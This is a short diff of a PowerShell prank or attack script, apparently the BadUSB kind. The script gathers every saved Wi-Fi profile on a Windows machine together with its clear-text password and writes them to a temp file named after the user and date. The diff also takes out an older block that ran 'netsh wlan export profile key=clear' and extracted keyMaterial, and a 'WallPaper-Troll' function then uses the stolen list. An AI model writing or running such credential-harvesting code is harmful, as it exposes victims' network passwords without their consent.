@@ -250,11 +250,12 @@ Foreach($WLANProfileName in $WLANProfileNames){
     $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
     $WLANProfileObjects += $WLANProfileObject
     Remove-Variable WLANProfileObject
-	return $WLANProfileObjects
 }
+return $WLANProfileObjects
 }
 
 $Networks = Get-Networks
+
 
 Add-Type @"
 using System;
@@ -360,13 +361,6 @@ Function Minimize-All
 
 #############################################################################################################################################
 
-cd $env:temp\
-netsh wlan export profile key=clear
-Select-String -Path Wi*.xml -Pattern 'keyMaterial' > wifipass.txt
-
-
-#############################################################################################################################################
-
 Function WallPaper-Troll {
 
 if (!$Networks) { Write-Host "variable is null" 
@@ -374,7 +368,7 @@ if (!$Networks) { Write-Host "variable is null"
 
 	# This is the name of the file the networks and passwords are saved 
 
-	$FileName = "wifipass.txt"
+	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
 
 	($Networks| Out-String) >> $Env:temp\$FileName
 
